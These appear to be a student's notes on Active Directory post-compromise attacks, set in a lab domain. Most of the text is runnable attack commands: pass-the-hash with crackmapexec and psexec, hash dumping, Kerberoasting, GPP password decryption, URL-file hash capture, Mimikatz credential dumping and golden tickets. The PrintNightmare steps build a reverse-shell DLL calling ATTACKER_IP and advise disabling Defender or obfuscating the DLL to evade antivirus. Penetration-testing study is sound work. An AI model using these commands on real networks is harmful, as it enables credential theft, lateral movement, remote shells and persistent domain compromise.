# 17. Attacking Active Directory: Post Compromise Attacks 

## Pass the Hash/ Password Overview

- If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks
- Pass around the password on all machines in a subnet.

## Pass the password attacks
- Using crackmapexec:

`crackmapsexec smb 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1` `--sam` 

`psexec.py marvel/fcastle:Password1@192.168.57.6`


## Dumping Hashes with secretsdump.py

- Part of Impacket toolkit

`secretsdump.py marvel/fcastle:Password1@192.168.57.5`


## Cracking NTLM Hashes with Hashcat

- You can pass NTLM, you cannot pass around NTLMv2 hashes

`hashcat -m 1000 hashes.txt rockyou.txt -O`

- Blank password in hashcat means it is disabled

## Pass the Hash Attacks

- Pass the hash around the whole network to see which machines authenticate with the hasg
`crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H <hash> --local-auth`

- Attempt to gain a shell using the authenticated hashes
`psexec.py "frank castle":@192.168.57.6 -hashes <full hash>`

## Token Impersonation overview

### What are tokens?
- Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. 
- Think cookies for computers
- Tokens exist until computer is rebooted
### Two Types:
- Delegate: Created for logging into a machine or using remote desktop
- Impersonate: "non-interactive" such as attaching a network drive or a domain logon script

## Token Impersonation with Incognito
- Start up metasploit
- Get shell with psexec `use exploit/windows/smb/psexec`
	- Set target 2
	- Set payload windows/x64/meterpreter/reverse_tcp
	- hashdump, getuid, sysinfo
	- load incognito or kiwi or mimikatz or powershell
	- incognito > list_tokens -u > impersonate_token marvel\\administrator
	- if hashdump dont work, type rev2self

## Kerberoasting Overview

## Kerberoasting Walkthrough
- From impacket, Server Principle Name
`GetUserSPNS.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.5 -request`

- Crack the hash
`hashcat -m 13100 hashes.txt rockyou.txt -O`

## Kerberoasting mitigation
- Strong passwords
- Least privilege (dont make service accounts domain administrator)

## GPP/cPassword Attacks Overview

- Group Policy Preferences (GPP)/ MS14-025
- [Group Policy Pwnage](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)

### Overview
- Group Policy Preferences allowed admins to create policies using embedded credentials
- These credentials were encrypted and placed in a "cPassword"
- The key was accidentally released(whoops)
- Patched in MS14-025, but doesn't prevent previous uses

> - Check using smb_enum_gpp in metasploit to see if it is vulnerable

### Abusing GPP 
1. `prompt off`
2. `recurse on`
3. `mget *`
4. `gpp-decrypt <cpassword here>`

## URL File Attacks
- [Active Directory Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)

- Play on SCF attack

Create Shortcut file:
```
# Save as "@test.url"
[InternetShortcut]
URL=blah 
WorkingDirectory=blah 
IconFile=\\x.x.x.x\%USERNAME%.icon 
IconIndex=1
```
- `responder -I eth0 -v`
- Let victim click on link in compromised share
- Retrieve hash in responder and crack or relay

## PrintNightmare (CVE-2021-1675)
- [cube0x0 RCE](https://github.com/cube0x0/CVE-2021-1675)
- [calebstewart LPE](https://github.com/calebstewart/CVE-2021-1675)

### Steps
- Following cube0x0 github above
1. Check if machine is vulnerable with rcpdump.py, change ip with domain controller 
`rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'`

If result =
```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```
Then machine is vulnerable

2. Install new impacket
3. Copy code from github and echo into python script
4. Create malicious dll: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=5555 -f dll > shell.dll`
5. Run msfconsole `use multi/handler`
6. `set payload windows/x64/meterpreter/reverse_tcp`
7. `set LPORT and LHOST as same as above`
8. Run smbserver.py from impacket `smbserver.py share 'pwd'`
9. Run exploit `
./CVE-2021-1675.py hackit.local/domain_user:Pass123@DC-IP '\\ATTACKER-IP\share\share.dll'
`
10. If error occurs, run smbserver.py(step 8) with -smb2support at the end.
11. Turn off windows defender if virus gets caught. 
12. For more serious dll creation, obfuscate dll and evade antivirus


## Mimikatz
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

### What is Mimikatz?
- Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
- Dumps credentials stored in memory
- Just a few attacks: Credential Dumping, Pass-the-hash, Over-Pass-the-Hash, Pass-the-ticket, Golden-ticket, Silver-ticket



## Credential Dumping with Mimikatz


- Extract to victim computer 
- Run `mimikatz.exe`
- Run `privilege::debug`
- Run `sekurlsa::logonpasswords`
- Examine result
- Run `lsadump::sam` add /patch or ::lsa (local security authority, protected subsystem in windows authentication)
- Check out `ntds.dit`

## Golden Ticket Attacks
- Abuses krbtgt (Kerberos ticket granting ticket) ticket hash found
- Open mimikatz
- Run `privilege::debug`
- Run `lsadump::lsa /inject /name:krbtgt`
 - Retrieve SID of domain, NTLM hash of krbtgt account
 - Run `kerberos::golden /User:Administrator /domain:domain.local /sid:SID-HERE /krbtgt:HASH_HERE /id:500 /ptt` 
	 - id is rid of account
	 - /ptt is pass the ticket
- Run `misc::cmd`
- Run commands in opened shell 
	- `dir \\THEPUNISHER\c$`
	- Check out running psexec in machine using the opened shell `psexec.exe \\THEPUNISHER cmd.exe`
- Golden ticket is basically persistence

> Homework
> - Check out Silver ticket 
> - Check our running psexec
